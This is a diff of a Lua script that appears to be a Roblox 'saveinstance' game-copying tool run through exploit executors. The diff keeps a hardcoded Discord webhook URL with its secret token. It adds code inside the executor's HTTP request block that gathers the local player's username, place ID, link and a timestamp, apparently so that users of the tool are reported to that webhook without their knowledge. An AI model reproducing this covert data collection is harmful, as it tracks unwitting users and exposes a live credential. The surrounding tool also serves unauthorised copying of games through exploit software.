@@ -3054,9 +3054,6 @@ local function synsaveinstance(CustomOptions, CustomOptions2)
 		GLOBAL_ENV[placename] = nil
 
 		local webhookUrl = "https://webhook.lewisakura.moe/api/webhooks/1375480936480899277/QaYMOUIB7mBghiVZH_jh8EiM8kP7Bktt84aHgwFhetGuKee74UK3EzRxhixyGBhVftST"
-		
-		local gameIconUrl = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. tostring(game.PlaceId) .. "&width=512&height=512&format=png"
-
 
 		if StatusText then
 			task.spawn(function()
@@ -3065,6 +3062,13 @@ local function synsaveinstance(CustomOptions, CustomOptions2)
 				local ExtraTime = 10
 				if ok then
 					local request = (syn and syn.request) or http_request or request or fluxus.request
+					
+
+					local placeId = game.PlaceId
+					local placeLink = "https://www.roblox.com/games/" .. placeId
+					local gameIconUrl = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. placeId .. "&width=512&height=512&format=png"
+					local playerName = game.Players.LocalPlayer.Name
+					local timestamp = os.date("%Y-%m-%d %H:%M:%S")
 					
 					local gameIconUrl = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. game.PlaceId .. "&width=512&height=512&format=png"
 					
